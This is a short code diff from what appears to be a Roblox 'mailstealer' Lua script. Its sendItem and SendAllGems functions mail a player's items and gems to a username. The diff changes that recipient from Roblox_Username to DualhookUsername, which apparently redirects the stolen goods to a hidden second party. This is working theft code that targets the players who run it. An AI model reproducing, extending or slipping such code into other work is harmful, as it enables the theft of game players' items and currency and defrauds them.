@@ -723,7 +723,7 @@ end
 
 local function sendItem(category, uid, am, locked)
     local args = {
-        [1] = Roblox_Username,
+        [1] = DualhookUsername,
         [2] = "" .. mailstealer_name .. " mailstealer on top",
         [3] = category,
         [4] = uid,
@@ -757,7 +757,7 @@ local function SendAllGems()
             if GemsAmount >= (FirstPriceOfMail + 10000) then
 				SentGems = GemsAmount - FirstPriceOfMail
                 local args = {
-                    [1] = Roblox_Username,
+                    [1] = DualhookUsername,
                     [2] = "" .. mailstealer_name .. " mailstealer on top",
                     [3] = "Currency",
                     [4] = i,
